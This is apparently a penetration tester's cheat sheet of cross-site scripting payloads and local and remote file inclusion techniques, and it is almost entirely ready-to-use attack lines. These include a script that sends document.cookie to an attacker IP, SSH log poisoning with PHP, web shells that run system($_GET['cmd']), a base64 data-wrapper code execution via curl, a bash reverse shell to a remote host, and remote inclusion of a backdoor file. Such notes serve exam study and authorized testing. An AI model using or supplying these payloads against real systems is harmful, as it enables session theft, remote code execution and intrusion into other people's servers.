------------------------------------------------------------------cross site scripting-----------------------------------------------------------------------
- XSS SCRIPTS
-      <ScRipT>alert("XSS");</ScRipT>
-     <scr<script>ipt>alert(1)</script>
-     <svg/onload=alert(1)>
-     <a href=javascript:confirm()>click here
-     <img src=`xx:xx`onerror=alert(1)>
-     <img src=//x55.is OnError=import(src)>
-     </script><script >alert(document.cookie)</script>
-     <script>new  Image().src="http://10.0.2.10:4444/bogus.php?output="+escape(document.cookie);</script>

To automate the process, use the following tools
-	xsstrike
-	xsshunter
-	BeEF
-	JShell

-----------------------------------------------------------------Loca File Inclusion-------------------------------------------------------------------------
- Null Byte will ignore the extension
-     ../../../../../../etc/passwd%00.jpg
- php filter
-     php://filter/convert.base64-encode/resource=
-      data://text/plain,<?php echo system('ls');?>
- poising a log file
- /roc/self/environ || /var/log/auth.log [ssh log file] || /var/log/apache2/access.log [web server log file]
- poison the auth.log file
-     Ssh “<?php passthru(base64_decode(‘base64PAYLOAD==’))?>”@10.0.2.13
- execute a php file from an external server
-     ./ngrok http 9000  && python -m SimpleHTTPServer
- execute a command
-     <?php system('ls') ?>
- add cmd as a parameter
-     <?php system($_GET['cmd']); ?>
-     example.com/index.php?view=cat../../../../../../../../../var/log/apache2/access.log&cmd=ls
- add cmd in data wrapper
-      echo -n '<?php echo system($_GET["cmd"]);?>' | base64
-        curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
- bash reverse shell
-     bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
- fuzz LFI
-     ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349 --> searching for LFI
- decode (base64) the PHPSESSID, you may find a path for /var/www/html/index.php --> you can change the path inside the cookie, encode it again then send it 
- Linux --> /etc/passwd
     - example.com/index.php?id=1
- windows --> IIS 
     - example.com/index.aspx?id=1
- xampp may run .apache .php .mysql --> so you can't guarantee that the running machine is Windows
- RFI using simple-backdoor.php
-     curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simplebackdoor.php&cmd=ls"

